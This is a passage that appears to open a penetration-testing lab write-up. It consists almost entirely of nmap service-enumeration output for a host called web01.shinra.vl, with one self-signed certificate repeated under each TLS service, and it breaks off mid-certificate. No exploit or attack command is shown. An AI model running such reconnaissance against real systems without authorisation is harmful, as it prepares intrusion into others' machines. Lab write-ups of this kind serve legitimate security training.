As usual I start by enumerating all the services open on the TCP stack and my my  they are a lot.

```bash
PORT      STATE SERVICE     REASON         VERSION
22/tcp    open  ssh         syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 48:98:eb:e9:0f:f9:8a:b5:32:f8:3d:64:28:13:2a:e7 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBA884SfaVWdkmGFYOlo8vIHeM0oOhFyKJTltaYs/49G6dKqvKCDgrlU8rsZ/fEpq8BFPzG45QvOKWMolsqUbb58=
|   256 a0:72:f3:27:04:86:a1:48:d1:ca:3b:24:1d:49:7f:ab (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILGwHTxQuts2wgh5DsveIVVGEg+5BO/GLzBJx0MzEuDk
25/tcp    open  smtp        syn-ack ttl 63 Postfix smtpd
| ssl-cert: Subject: commonName=web01.shinra.vl/organizationName=Shinra/stateOrProvinceName=Tokyo/countryName=JP/localityName=Tokyo/organizationalUnitName=Dev/emailAddress=webadm@shinra.vl
| Issuer: commonName=web01.shinra.vl/organizationName=Shinra/stateOrProvinceName=Tokyo/countryName=JP/localityName=Tokyo/organizationalUnitName=Dev/emailAddress=webadm@shinra.vl
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-12-08T14:50:56
| Not valid after:  2023-12-08T14:50:56
| MD5:     1217 863a 2b3a 0507 2d80 2951 2454 7e3c
| SHA-1:   a95e a6dd 33de 4a5a afcb 2329 c6b8 4693 e143 e242
| SHA-256: fb08 c458 353c a917 ea00 8cd1 5824 9739 c740 390c 3980 c26b d530 72e6 29ce 2916
| -----BEGIN CERTIFICATE-----
| MIIF8TCCA9mgAwIBAgIUda6ykF9DFsX8b27IiaqnpZsfXlkwDQYJKoZIhvcNAQEL
| BQAwgYcxCzAJBgNVBAYTAkpQMQ4wDAYDVQQIDAVUb2t5bzEOMAwGA1UEBwwFVG9r
| eW8xDzANBgNVBAoMBlNoaW5yYTEMMAoGA1UECwwDRGV2MRgwFgYDVQQDDA93ZWIw
| MS5zaGlucmEudmwxHzAdBgkqhkiG9w0BCQEWEHdlYmFkbUBzaGlucmEudmwwHhcN
| MjIxMjA4MTQ1MDU2WhcNMjMxMjA4MTQ1MDU2WjCBhzELMAkGA1UEBhMCSlAxDjAM
| BgNVBAgMBVRva3lvMQ4wDAYDVQQHDAVUb2t5bzEPMA0GA1UECgwGU2hpbnJhMQww
| CgYDVQQLDANEZXYxGDAWBgNVBAMMD3dlYjAxLnNoaW5yYS52bDEfMB0GCSqGSIb3
| DQEJARYQd2ViYWRtQHNoaW5yYS52bDCCAiIwDQYJKoZIhvcNAQEBBQADggIPADCC
| AgoCggIBAJogHCCZQVWisy1ick+NyTNE9pCnPKIoaoU14EBjQAjO/40treINVsCQ
| YopJuG/MvjqYwylFDTlX6K0W913QKN7DeH+EoQrI052O+WRymNKOzeFNwnVgzXy3
| ANhcZOlvSUC0mu8MMvg8/abDemdxUYSy1Fgt7gYeaLr9expfrHWHavngF7gzin3M
| tkxgRvEUE4C4BIBuwa8JPxvx+E+iU+Lko5l+1T2XP6tnM8DfrQKh4BokU9Js8Bb8
| +C2x0ajFVQfdxstgv+o5Cdsy+znpW8+OCKgikfyetsd5/vuMSuPLzkg2PNVCJZ7V
| gthzzMkP8Pz2hUhTLMqc/6VyZuVFcAHIg53FMvVhC5NPxfSogmfeo1nEk1xA8ib7
| xoB0kNIY2QiuaRpyqtR5Y05nzJAaRFvu7p6cQXclyy/8hCjaifFPo9mU00qQsmdE
| c7hcVpmgsB6T5BrQ2Bo6HG3ARUr/uTu6UsFMlN8zwxM4KkB4iNmeiCpdO48bpPig
| 7HwY80qPh8s7sWhYS58PSVbueGiin51sDX/QUkv96H4m3EQDoBHShqO5YblNUUOY
| lu2pHEWsSnB9yFufbER67pR7JYiIPnLiZ+DP5olQ2qrpjKiZ8YL1CjTZyLVML3hG
| 4ktXyTDSzDv94LKHksw4IwbyDHg5/pYVBysrqHRNrnaLKXkSxRrrAgMBAAGjUzBR
| MB0GA1UdDgQWBBRL/2IoqHcdK/VTb6Ejf0tyB7jkkDAfBgNVHSMEGDAWgBRL/2Io
| qHcdK/VTb6Ejf0tyB7jkkDAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUA
| A4ICAQBpMPR8ixMj0SPQbjQpHq8I+kbivvce8Vc0+/WlabGPJaK0kxgnODKlC7wg
| 3XCL2X/QVYoLpygrySiCCTDN1xODTRhaDRV0ehC8nl+TFMBQ4KKc1qIblkOawQ3s
| 8n9zNKLJzoHxrWmlS1QUSjGgo4Gmg4MWFkXX5NAkYR+26w3lRGuS4qZFARTHBCbu
| slTcReAim6OwGdoueX3SaFVfIAQxGHldW9dw3FRtvoVfpXX5zZ7fiZxH1r8A/xnD
| UWIGFpqXpQd1Jgathspnl7kcOo84oxSgNDFNBY8bRgvBnDGcFbT0xJh+WAA46XI3
| 3Pn37W5Z+7EUjB99wlVA6e0szv3ih97RoKIoeaQ/C584hvNVNGkkE9n/fCUGs/Bc
| AwIkXzuDikMCCd4ourll1+uCrQH+7uqCtzPJH1RsFzprvAGXq+O84Cn6OBUviPbH
| +4b2GBrkrJyXhb1hVyv9J++s+5IkQWlBJY+kBYFe+MtctgjsTELqpRUgsRjMEiZp
| xI86GxptPTW5t0Sz6ayzB9Z8R/Qwj0FrpVLrLgHYoKdL3CIk9oxQd+Izd3HHbfIU
| AEQQsm35kRv2UMsuKxgpX8i9v0i8q2R7H1xVQK+FvvWaK9/9RBddUn1c5bx3eQO7
| rtij4wb6a50EJu7XI2ZdB2juF/L5WJt9kJ5MLoEzHRcNc6kcYQ==
|_-----END CERTIFICATE-----
|_smtp-commands: mail.shinra.vl, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, AUTH PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING
|_ssl-date: TLS randomness does not represent time
80/tcp    open  http        syn-ack ttl 63 Apache httpd 2.4.52 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: \xE7\xA5\x9E\xE7\xBE\x85 VPN Gateway
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.52 (Ubuntu)
110/tcp   open  pop3        syn-ack ttl 63 Dovecot pop3d
|_pop3-capabilities: AUTH-RESP-CODE RESP-CODES CAPA STLS TOP UIDL PIPELINING SASL
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=web01.shinra.vl/organizationName=Shinra/stateOrProvinceName=Tokyo/countryName=JP/localityName=Tokyo/organizationalUnitName=Dev/emailAddress=webadm@shinra.vl
| Issuer: commonName=web01.shinra.vl/organizationName=Shinra/stateOrProvinceName=Tokyo/countryName=JP/localityName=Tokyo/organizationalUnitName=Dev/emailAddress=webadm@shinra.vl
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-12-08T14:50:56
| Not valid after:  2023-12-08T14:50:56
| MD5:     1217 863a 2b3a 0507 2d80 2951 2454 7e3c
| SHA-1:   a95e a6dd 33de 4a5a afcb 2329 c6b8 4693 e143 e242
| SHA-256: fb08 c458 353c a917 ea00 8cd1 5824 9739 c740 390c 3980 c26b d530 72e6 29ce 2916
| -----BEGIN CERTIFICATE-----
| MIIF8TCCA9mgAwIBAgIUda6ykF9DFsX8b27IiaqnpZsfXlkwDQYJKoZIhvcNAQEL
| BQAwgYcxCzAJBgNVBAYTAkpQMQ4wDAYDVQQIDAVUb2t5bzEOMAwGA1UEBwwFVG9r
| eW8xDzANBgNVBAoMBlNoaW5yYTEMMAoGA1UECwwDRGV2MRgwFgYDVQQDDA93ZWIw
| MS5zaGlucmEudmwxHzAdBgkqhkiG9w0BCQEWEHdlYmFkbUBzaGlucmEudmwwHhcN
| MjIxMjA4MTQ1MDU2WhcNMjMxMjA4MTQ1MDU2WjCBhzELMAkGA1UEBhMCSlAxDjAM
| BgNVBAgMBVRva3lvMQ4wDAYDVQQHDAVUb2t5bzEPMA0GA1UECgwGU2hpbnJhMQww
| CgYDVQQLDANEZXYxGDAWBgNVBAMMD3dlYjAxLnNoaW5yYS52bDEfMB0GCSqGSIb3
| DQEJARYQd2ViYWRtQHNoaW5yYS52bDCCAiIwDQYJKoZIhvcNAQEBBQADggIPADCC
| AgoCggIBAJogHCCZQVWisy1ick+NyTNE9pCnPKIoaoU14EBjQAjO/40treINVsCQ
| YopJuG/MvjqYwylFDTlX6K0W913QKN7DeH+EoQrI052O+WRymNKOzeFNwnVgzXy3
| ANhcZOlvSUC0mu8MMvg8/abDemdxUYSy1Fgt7gYeaLr9expfrHWHavngF7gzin3M
| tkxgRvEUE4C4BIBuwa8JPxvx+E+iU+Lko5l+1T2XP6tnM8DfrQKh4BokU9Js8Bb8
| +C2x0ajFVQfdxstgv+o5Cdsy+znpW8+OCKgikfyetsd5/vuMSuPLzkg2PNVCJZ7V
| gthzzMkP8Pz2hUhTLMqc/6VyZuVFcAHIg53FMvVhC5NPxfSogmfeo1nEk1xA8ib7
| xoB0kNIY2QiuaRpyqtR5Y05nzJAaRFvu7p6cQXclyy/8hCjaifFPo9mU00qQsmdE
| c7hcVpmgsB6T5BrQ2Bo6HG3ARUr/uTu6UsFMlN8zwxM4KkB4iNmeiCpdO48bpPig
| 7HwY80qPh8s7sWhYS58PSVbueGiin51sDX/QUkv96H4m3EQDoBHShqO5YblNUUOY
| lu2pHEWsSnB9yFufbER67pR7JYiIPnLiZ+DP5olQ2qrpjKiZ8YL1CjTZyLVML3hG
| 4ktXyTDSzDv94LKHksw4IwbyDHg5/pYVBysrqHRNrnaLKXkSxRrrAgMBAAGjUzBR
| MB0GA1UdDgQWBBRL/2IoqHcdK/VTb6Ejf0tyB7jkkDAfBgNVHSMEGDAWgBRL/2Io
| qHcdK/VTb6Ejf0tyB7jkkDAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUA
| A4ICAQBpMPR8ixMj0SPQbjQpHq8I+kbivvce8Vc0+/WlabGPJaK0kxgnODKlC7wg
| 3XCL2X/QVYoLpygrySiCCTDN1xODTRhaDRV0ehC8nl+TFMBQ4KKc1qIblkOawQ3s
| 8n9zNKLJzoHxrWmlS1QUSjGgo4Gmg4MWFkXX5NAkYR+26w3lRGuS4qZFARTHBCbu
| slTcReAim6OwGdoueX3SaFVfIAQxGHldW9dw3FRtvoVfpXX5zZ7fiZxH1r8A/xnD
| UWIGFpqXpQd1Jgathspnl7kcOo84oxSgNDFNBY8bRgvBnDGcFbT0xJh+WAA46XI3
| 3Pn37W5Z+7EUjB99wlVA6e0szv3ih97RoKIoeaQ/C584hvNVNGkkE9n/fCUGs/Bc
| AwIkXzuDikMCCd4ourll1+uCrQH+7uqCtzPJH1RsFzprvAGXq+O84Cn6OBUviPbH
| +4b2GBrkrJyXhb1hVyv9J++s+5IkQWlBJY+kBYFe+MtctgjsTELqpRUgsRjMEiZp
| xI86GxptPTW5t0Sz6ayzB9Z8R/Qwj0FrpVLrLgHYoKdL3CIk9oxQd+Izd3HHbfIU
| AEQQsm35kRv2UMsuKxgpX8i9v0i8q2R7H1xVQK+FvvWaK9/9RBddUn1c5bx3eQO7
| rtij4wb6a50EJu7XI2ZdB2juF/L5WJt9kJ5MLoEzHRcNc6kcYQ==
|_-----END CERTIFICATE-----
143/tcp   open  imap        syn-ack ttl 63 Dovecot imapd (Ubuntu)
|_imap-capabilities: listed have post-login IMAP4rev1 LITERAL+ more capabilities OK Pre-login LOGIN-REFERRALS ID LOGINDISABLEDA0001 SASL-IR IDLE ENABLE STARTTLS
| ssl-cert: Subject: commonName=web01.shinra.vl/organizationName=Shinra/stateOrProvinceName=Tokyo/countryName=JP/localityName=Tokyo/organizationalUnitName=Dev/emailAddress=webadm@shinra.vl
| Issuer: commonName=web01.shinra.vl/organizationName=Shinra/stateOrProvinceName=Tokyo/countryName=JP/localityName=Tokyo/organizationalUnitName=Dev/emailAddress=webadm@shinra.vl
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-12-08T14:50:56
| Not valid after:  2023-12-08T14:50:56
| MD5:     1217 863a 2b3a 0507 2d80 2951 2454 7e3c
| SHA-1:   a95e a6dd 33de 4a5a afcb 2329 c6b8 4693 e143 e242
| SHA-256: fb08 c458 353c a917 ea00 8cd1 5824 9739 c740 390c 3980 c26b d530 72e6 29ce 2916
| -----BEGIN CERTIFICATE-----
| MIIF8TCCA9mgAwIBAgIUda6ykF9DFsX8b27IiaqnpZsfXlkwDQYJKoZIhvcNAQEL
| BQAwgYcxCzAJBgNVBAYTAkpQMQ4wDAYDVQQIDAVUb2t5bzEOMAwGA1UEBwwFVG9r
| eW8xDzANBgNVBAoMBlNoaW5yYTEMMAoGA1UECwwDRGV2MRgwFgYDVQQDDA93ZWIw
| MS5zaGlucmEudmwxHzAdBgkqhkiG9w0BCQEWEHdlYmFkbUBzaGlucmEudmwwHhcN
| MjIxMjA4MTQ1MDU2WhcNMjMxMjA4MTQ1MDU2WjCBhzELMAkGA1UEBhMCSlAxDjAM
| BgNVBAgMBVRva3lvMQ4wDAYDVQQHDAVUb2t5bzEPMA0GA1UECgwGU2hpbnJhMQww
| CgYDVQQLDANEZXYxGDAWBgNVBAMMD3dlYjAxLnNoaW5yYS52bDEfMB0GCSqGSIb3
| DQEJARYQd2ViYWRtQHNoaW5yYS52bDCCAiIwDQYJKoZIhvcNAQEBBQADggIPADCC
| AgoCggIBAJogHCCZQVWisy1ick+NyTNE9pCnPKIoaoU14EBjQAjO/40treINVsCQ
| YopJuG/MvjqYwylFDTlX6K0W913QKN7DeH+EoQrI052O+WRymNKOzeFNwnVgzXy3
| ANhcZOlvSUC0mu8MMvg8/abDemdxUYSy1Fgt7gYeaLr9expfrHWHavngF7gzin3M
| tkxgRvEUE4C4BIBuwa8JPxvx+E+iU+Lko5l+1T2XP6tnM8DfrQKh4BokU9Js8Bb8
| +C2x0ajFVQfdxstgv+o5Cdsy+znpW8+OCKgikfyetsd5/vuMSuPLzkg2PNVCJZ7V
| gthzzMkP8Pz2hUhTLMqc/6VyZuVFcAHIg53FMvVhC5NPxfSogmfeo1nEk1xA8ib7
| xoB0kNIY2QiuaRpyqtR5Y05nzJAaRFvu7p6cQXclyy/8hCjaifFPo9mU00qQsmdE
| c7hcVpmgsB6T5BrQ2Bo6HG3ARUr/uTu6UsFMlN8zwxM4KkB4iNmeiCpdO48bpPig
| 7HwY80qPh8s7sWhYS58PSVbueGiin51sDX/QUkv96H4m3EQDoBHShqO5YblNUUOY
| lu2pHEWsSnB9yFufbER67pR7JYiIPnLiZ+DP5olQ2qrpjKiZ8YL1CjTZyLVML3hG
| 4ktXyTDSzDv94LKHksw4IwbyDHg5/pYVBysrqHRNrnaLKXkSxRrrAgMBAAGjUzBR
| MB0GA1UdDgQWBBRL/2IoqHcdK/VTb6Ejf0tyB7jkkDAfBgNVHSMEGDAWgBRL/2Io
| qHcdK/VTb6Ejf0tyB7jkkDAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUA
| A4ICAQBpMPR8ixMj0SPQbjQpHq8I+kbivvce8Vc0+/WlabGPJaK0kxgnODKlC7wg
| 3XCL2X/QVYoLpygrySiCCTDN1xODTRhaDRV0ehC8nl+TFMBQ4KKc1qIblkOawQ3s
| 8n9zNKLJzoHxrWmlS1QUSjGgo4Gmg4MWFkXX5NAkYR+26w3lRGuS4qZFARTHBCbu
| slTcReAim6OwGdoueX3SaFVfIAQxGHldW9dw3FRtvoVfpXX5zZ7fiZxH1r8A/xnD
| UWIGFpqXpQd1Jgathspnl7kcOo84oxSgNDFNBY8bRgvBnDGcFbT0xJh+WAA46XI3
| 3Pn37W5Z+7EUjB99wlVA6e0szv3ih97RoKIoeaQ/C584hvNVNGkkE9n/fCUGs/Bc
| AwIkXzuDikMCCd4ourll1+uCrQH+7uqCtzPJH1RsFzprvAGXq+O84Cn6OBUviPbH
| +4b2GBrkrJyXhb1hVyv9J++s+5IkQWlBJY+kBYFe+MtctgjsTELqpRUgsRjMEiZp
| xI86GxptPTW5t0Sz6ayzB9Z8R/Qwj0FrpVLrLgHYoKdL3CIk9oxQd+Izd3HHbfIU
| AEQQsm35kRv2UMsuKxgpX8i9v0i8q2R7H1xVQK+FvvWaK9/9RBddUn1c5bx3eQO7
| rtij4wb6a50EJu7XI2ZdB2juF/L5WJt9kJ5MLoEzHRcNc6kcYQ==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
443/tcp   open  ssl/http    syn-ack ttl 63 Apache httpd 2.4.52 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: commonName=web01.shinra.vl/organizationName=Shinra/stateOrProvinceName=Tokyo/countryName=JP/localityName=Tokyo/organizationalUnitName=Dev/emailAddress=webadm@shinra.vl
| Issuer: commonName=web01.shinra.vl/organizationName=Shinra/stateOrProvinceName=Tokyo/countryName=JP/localityName=Tokyo/organizationalUnitName=Dev/emailAddress=webadm@shinra.vl
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-12-08T14:50:56
| Not valid after:  2023-12-08T14:50:56
| MD5:     1217 863a 2b3a 0507 2d80 2951 2454 7e3c
| SHA-1:   a95e a6dd 33de 4a5a afcb 2329 c6b8 4693 e143 e242
| SHA-256: fb08 c458 353c a917 ea00 8cd1 5824 9739 c740 390c 3980 c26b d530 72e6 29ce 2916
| -----BEGIN CERTIFICATE-----
| MIIF8TCCA9mgAwIBAgIUda6ykF9DFsX8b27IiaqnpZsfXlkwDQYJKoZIhvcNAQEL
| BQAwgYcxCzAJBgNVBAYTAkpQMQ4wDAYDVQQIDAVUb2t5bzEOMAwGA1UEBwwFVG9r
| eW8xDzANBgNVBAoMBlNoaW5yYTEMMAoGA1UECwwDRGV2MRgwFgYDVQQDDA93ZWIw
| MS5zaGlucmEudmwxHzAdBgkqhkiG9w0BCQEWEHdlYmFkbUBzaGlucmEudmwwHhcN
| MjIxMjA4MTQ1MDU2WhcNMjMxMjA4MTQ1MDU2WjCBhzELMAkGA1UEBhMCSlAxDjAM
| BgNVBAgMBVRva3lvMQ4wDAYDVQQHDAVUb2t5bzEPMA0GA1UECgwGU2hpbnJhMQww
| CgYDVQQLDANEZXYxGDAWBgNVBAMMD3dlYjAxLnNoaW5yYS52bDEfMB0GCSqGSIb3
| DQEJARYQd2ViYWRtQHNoaW5yYS52bDCCAiIwDQYJKoZIhvcNAQEBBQADggIPADCC
| AgoCggIBAJogHCCZQVWisy1ick+NyTNE9pCnPKIoaoU14EBjQAjO/40treINVsCQ
| YopJuG/MvjqYwylFDTlX6K0W913QKN7DeH+EoQrI052O+WRymNKOzeFNwnVgzXy3
| ANhcZOlvSUC0mu8MMvg8/abDemdxUYSy1Fgt7gYeaLr9expfrHWHavngF7gzin3M
| tkxgRvEUE4C4BIBuwa8JPxvx+E+iU+Lko5l+1T2XP6tnM8DfrQKh4BokU9Js8Bb8
| +C2x0ajFVQfdxstgv+o5Cdsy+znpW8+OCKgikfyetsd5/vuMSuPLzkg2PNVCJZ7V
| gthzzMkP8Pz2hUhTLMqc/6VyZuVFcAHIg53FMvVhC5NPxfSogmfeo1nEk1xA8ib7
| xoB0kNIY2QiuaRpyqtR5Y05nzJAaRFvu7p6cQXclyy/8hCjaifFPo9mU00qQsmdE
| c7hcVpmgsB6T5BrQ2Bo6HG3ARUr/uTu6UsFMlN8zwxM4KkB4iNmeiCpdO48bpPig
| 7HwY80qPh8s7sWhYS58PSVbueGiin51sDX/QUkv96H4m3EQDoBHShqO5YblNUUOY
| lu2pHEWsSnB9yFufbER67pR7JYiIPnLiZ+DP5olQ2qrpjKiZ8YL1CjTZyLVML3hG
| 4ktXyTDSzDv94LKHksw4IwbyDHg5/pYVBysrqHRNrnaLKXkSxRrrAgMBAAGjUzBR
| MB0GA1UdDgQWBBRL/2IoqHcdK/VTb6Ejf0tyB7jkkDAfBgNVHSMEGDAWgBRL/2Io
| qHcdK/VTb6Ejf0tyB7jkkDAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUA
| A4ICAQBpMPR8ixMj0SPQbjQpHq8I+kbivvce8Vc0+/WlabGPJaK0kxgnODKlC7wg
| 3XCL2X/QVYoLpygrySiCCTDN1xODTRhaDRV0ehC8nl+TFMBQ4KKc1qIblkOawQ3s
| 8n9zNKLJzoHxrWmlS1QUSjGgo4Gmg4MWFkXX5NAkYR+26w3lRGuS4qZFARTHBCbu
| slTcReAim6OwGdoueX3SaFVfIAQxGHldW9dw3FRtvoVfpXX5zZ7fiZxH1r8A/xnD
| UWIGFpqXpQd1Jgathspnl7kcOo84oxSgNDFNBY8bRgvBnDGcFbT0xJh+WAA46XI3
| 3Pn37W5Z+7EUjB99wlVA6e0szv3ih97RoKIoeaQ/C584hvNVNGkkE9n/fCUGs/Bc
| AwIkXzuDikMCCd4ourll1+uCrQH+7uqCtzPJH1RsFzprvAGXq+O84Cn6OBUviPbH
| +4b2GBrkrJyXhb1hVyv9J++s+5IkQWlBJY+kBYFe+MtctgjsTELqpRUgsRjMEiZp
| xI86GxptPTW5t0Sz6ayzB9Z8R/Qwj0FrpVLrLgHYoKdL3CIk9oxQd+Izd3HHbfIU
| AEQQsm35kRv2UMsuKxgpX8i9v0i8q2R7H1xVQK+FvvWaK9/9RBddUn1c5bx3eQO7
| rtij4wb6a50EJu7XI2ZdB2juF/L5WJt9kJ5MLoEzHRcNc6kcYQ==
|_-----END CERTIFICATE-----
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: \xE7\xA5\x9E\xE7\xBE\x85 VPN Gateway
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
587/tcp   open  smtp        syn-ack ttl 63 Postfix smtpd
| ssl-cert: Subject: commonName=web01.shinra.vl/organizationName=Shinra/stateOrProvinceName=Tokyo/countryName=JP/localityName=Tokyo/organizationalUnitName=Dev/emailAddress=webadm@shinra.vl
| Issuer: commonName=web01.shinra.vl/organizationName=Shinra/stateOrProvinceName=Tokyo/countryName=JP/localityName=Tokyo/organizationalUnitName=Dev/emailAddress=webadm@shinra.vl
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-12-08T14:50:56
| Not valid after:  2023-12-08T14:50:56
| MD5:     1217 863a 2b3a 0507 2d80 2951 2454 7e3c
| SHA-1:   a95e a6dd 33de 4a5a afcb 2329 c6b8 4693 e143 e242
| SHA-256: fb08 c458 353c a917 ea00 8cd1 5824 9739 c740 390c 3980 c26b d530 72e6 29ce 2916
| -----BEGIN CERTIFICATE-----
| MIIF8TCCA9mgAwIBAgIUda6ykF9DFsX8b27IiaqnpZsfXlkwDQYJKoZIhvcNAQEL
| BQAwgYcxCzAJBgNVBAYTAkpQMQ4wDAYDVQQIDAVUb2t5bzEOMAwGA1UEBwwFVG9r
| eW8xDzANBgNVBAoMBlNoaW5yYTEMMAoGA1UECwwDRGV2MRgwFgYDVQQDDA93ZWIw
| MS5zaGlucmEudmwxHzAdBgkqhkiG9w0BCQEWEHdlYmFkbUBzaGlucmEudmwwHhcN
| MjIxMjA4MTQ1MDU2WhcNMjMxMjA4MTQ1MDU2WjCBhzELMAkGA1UEBhMCSlAxDjAM
| BgNVBAgMBVRva3lvMQ4wDAYDVQQHDAVUb2t5bzEPMA0GA1UECgwGU2hpbnJhMQww
| CgYDVQQLDANEZXYxGDAWBgNVBAMMD3dlYjAxLnNoaW5yYS52bDEfMB0GCSqGSIb3
| DQEJARYQd2ViYWRtQHNoaW5yYS52bDCCAiIwDQYJKoZIhvcNAQEBBQADggIPADCC
| AgoCggIBAJogHCCZQVWisy1ick+NyTNE9pCnPKIoaoU14EBjQAjO/40treINVsCQ
| YopJuG/MvjqYwylFDTlX6K0W913QKN7DeH+EoQrI052O+WRymNKOzeFNwnVgzXy3
| ANhcZOlvSUC0mu8MMvg8/abDemdxUYSy1Fgt7gYeaLr9expfrHWHavngF7gzin3M
| tkxgRvEUE4C4BIBuwa8JPxvx+E+iU+Lko5l+1T2XP6tnM8DfrQKh4BokU9Js8Bb8
| +C2x0ajFVQfdxstgv+o5Cdsy+znpW8+OCKgikfyetsd5/vuMSuPLzkg2PNVCJZ7V
| gthzzMkP8Pz2hUhTLMqc/6VyZuVFcAHIg53FMvVhC5NPxfSogmfeo1nEk1xA8ib7
| xoB0kNIY2QiuaRpyqtR5Y05nzJAaRFvu7p6cQXclyy/8hCjaifFPo9mU00qQsmdE
| c7hcVpmgsB6T5BrQ2Bo6HG3ARUr/uTu6UsFMlN8zwxM4KkB4iNmeiCpdO48bpPig
| 7HwY80qPh8s7sWhYS58PSVbueGiin51sDX/QUkv96H4m3EQDoBHShqO5YblNUUOY
| lu2pHEWsSnB9yFufbER67pR7JYiIPnLiZ+DP5olQ2qrpjKiZ8YL1CjTZyLVML3hG
| 4ktXyTDSzDv94LKHksw4IwbyDHg5/pYVBysrqHRNrnaLKXkSxRrrAgMBAAGjUzBR
| MB0GA1UdDgQWBBRL/2IoqHcdK/VTb6Ejf0tyB7jkkDAfBgNVHSMEGDAWgBRL/2Io
| qHcdK/VTb6Ejf0tyB7jkkDAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUA
| A4ICAQBpMPR8ixMj0SPQbjQpHq8I+kbivvce8Vc0+/WlabGPJaK0kxgnODKlC7wg
| 3XCL2X/QVYoLpygrySiCCTDN1xODTRhaDRV0ehC8nl+TFMBQ4KKc1qIblkOawQ3s
| 8n9zNKLJzoHxrWmlS1QUSjGgo4Gmg4MWFkXX5NAkYR+26w3lRGuS4qZFARTHBCbu
| slTcReAim6OwGdoueX3SaFVfIAQxGHldW9dw3FRtvoVfpXX5zZ7fiZxH1r8A/xnD
| UWIGFpqXpQd1Jgathspnl7kcOo84oxSgNDFNBY8bRgvBnDGcFbT0xJh+WAA46XI3
| 3Pn37W5Z+7EUjB99wlVA6e0szv3ih97RoKIoeaQ/C584hvNVNGkkE9n/fCUGs/Bc
| AwIkXzuDikMCCd4ourll1+uCrQH+7uqCtzPJH1RsFzprvAGXq+O84Cn6OBUviPbH
| +4b2GBrkrJyXhb1hVyv9J++s+5IkQWlBJY+kBYFe+MtctgjsTELqpRUgsRjMEiZp
| xI86GxptPTW5t0Sz6ayzB9Z8R/Qwj0FrpVLrLgHYoKdL3CIk9oxQd+Izd3HHbfIU
| AEQQsm35kRv2UMsuKxgpX8i9v0i8q2R7H1xVQK+FvvWaK9/9RBddUn1c5bx3eQO7
| rtij4wb6a50EJu7XI2ZdB2juF/L5WJt9kJ5MLoEzHRcNc6kcYQ==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
|_smtp-commands: mail.shinra.vl, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, AUTH PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING
993/tcp   open  ssl/imap    syn-ack ttl 63 Dovecot imapd (Ubuntu)
| ssl-cert: Subject: commonName=web01.shinra.vl/organizationName=Shinra/stateOrProvinceName=Tokyo/countryName=JP/localityName=Tokyo/organizationalUnitName=Dev/emailAddress=webadm@shinra.vl
| Issuer: commonName=web01.shinra.vl/organizationName=Shinra/stateOrProvinceName=Tokyo/countryName=JP/localityName=Tokyo/organizationalUnitName=Dev/emailAddress=webadm@shinra.vl
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-12-08T14:50:56
| Not valid after:  2023-12-08T14:50:56
| MD5:     1217 863a 2b3a 0507 2d80 2951 2454 7e3c
| SHA-1:   a95e a6dd 33de 4a5a afcb 2329 c6b8 4693 e143 e242
| SHA-256: fb08 c458 353c a917 ea00 8cd1 5824 9739 c740 390c 3980 c26b d530 72e6 29ce 2916
| -----BEGIN CERTIFICATE-----
| MIIF8TCCA9mgAwIBAgIUda6ykF9DFsX8b27IiaqnpZsfXlkwDQYJKoZIhvcNAQEL
| BQAwgYcxCzAJBgNVBAYTAkpQMQ4wDAYDVQQIDAVUb2t5bzEOMAwGA1UEBwwFVG9r
| eW8xDzANBgNVBAoMBlNoaW5yYTEMMAoGA1UECwwDRGV2MRgwFgYDVQQDDA93ZWIw
| MS5zaGlucmEudmwxHzAdBgkqhkiG9w0BCQEWEHdlYmFkbUBzaGlucmEudmwwHhcN
| MjIxMjA4MTQ1MDU2WhcNMjMxMjA4MTQ1MDU2WjCBhzELMAkGA1UEBhMCSlAxDjAM
| BgNVBAgMBVRva3lvMQ4wDAYDVQQHDAVUb2t5bzEPMA0GA1UECgwGU2hpbnJhMQww
| CgYDVQQLDANEZXYxGDAWBgNVBAMMD3dlYjAxLnNoaW5yYS52bDEfMB0GCSqGSIb3
| DQEJARYQd2ViYWRtQHNoaW5yYS52bDCCAiIwDQYJKoZIhvcNAQEBBQADggIPADCC
| AgoCggIBAJogHCCZQVWisy1ick+NyTNE9pCnPKIoaoU14EBjQAjO/40treINVsCQ
| YopJuG/MvjqYwylFDTlX6K0W913QKN7DeH+EoQrI052O+WRymNKOzeFNwnVgzXy3
